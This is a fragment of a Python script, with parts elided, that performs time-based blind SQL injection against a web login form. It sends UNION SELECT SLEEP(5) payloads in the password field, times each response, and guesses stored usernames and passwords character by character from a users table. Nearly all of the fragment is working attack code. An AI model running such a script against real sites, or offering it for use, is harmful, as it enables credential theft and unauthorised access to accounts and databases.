    ...
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            ...
            for i in range(1,4):
                ...
                passwd = "' UNION SELECT SLEEP(5),1,2 username FROM users WHERE id = '" + str(i) + "' and password like '" + texte + dictionary[j] + "%' -- "
            ...
            for i in range(1,4):
                usr = "idc"
                start_time = time.time()
                passwd = "' UNION SELECT SLEEP(5),1,2 username FROM users WHERE id = '" + str(i) + "' and username like '" + texte2 + dictionary[j] + "%' -- "
                response = requests.post(url, data={'username': usr, 'password': passwd})
                """print(passwd)"""
                end_time = time.time()
                total_time = end_time - start_time
